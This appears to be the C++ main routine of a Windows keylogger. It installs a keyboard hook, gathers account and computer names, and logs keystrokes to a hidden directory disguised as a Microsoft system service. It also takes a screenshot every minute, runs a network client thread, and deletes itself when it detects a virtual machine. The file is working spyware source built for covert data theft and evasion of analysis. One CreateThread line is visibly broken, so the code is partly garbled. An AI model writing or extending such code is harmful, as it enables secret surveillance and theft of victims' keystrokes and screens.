#include "stream.h"
#include "keyhook.h"
#include "screen.h"
#include "sys.h"
#include "network.h"
#include "debug.h"

#include <thread>

#ifdef DEBUG_BUILD
#include "encrypt.h"
#endif

int main() {
#ifdef DEBUG_BUILD
	Sys::CreateShell();
#endif

#ifndef DEBUG_BUILD
	if (Sys::CheckForVirtualMachine()) {
		KeyHook::UninstallHook();
		Sys::RemoveFromRegistry();
		KeyHook::KillProcess();
		return 0;
	}

//  Sys::AddToRegistry();
	KeyHook::InstallHook();
	clientInfo = Stream::GetAccountInfo(clientInfo);

	std::string path    = Stream::GetPath("\\Microsoft\\");
	std::string dirName = "SystemService";

	Stream::MakeDir(path, dirName, FILE_ATTRIBUTE_HIDDEN);
	Stream::MakeFile("wnxshl2.sys.log", path + "\\" + dirName);
	Stream::LogFile logFile(path + dirName, "wnxshl2.sys.log");

	Stream::WriteLog("[*] BOOT [*]", KeyHook::activeProcess, logFile, false);

	std::ostringstream ostream;

	ostream << "\n[*] OS Info: Major - " << clientInfo.osVersionInfo.dwMajorVersion << "; Minor - "
	        << clientInfo.osVersionInfo.dwMinorVersion << " [*]"
	        << "\n[*] Account Info: User -" << clientInfo.accountName << "; Computer - " << clientInfo.computerName
	        << " [*]";

	std::string write = ostream.str();
	Stream::WriteLog(write, KeyHook::activeProcess, logFile, false);
	Screen::CaptureScreen(path + "\\", "winpst", true, 60000); // Screenshot

	std::thread serverThread(ClientThread, nullptr, path);
	HANDLE serverHandle = CreateThread(nullptr, 0, ClientThread, nullptr, path, )
	std::thread keylogThread(KeyHook::HandleMessage, true);

	serverThread.join();
	keylogThread.join();

#endif // DEBUG_BUILD
	return 0;
}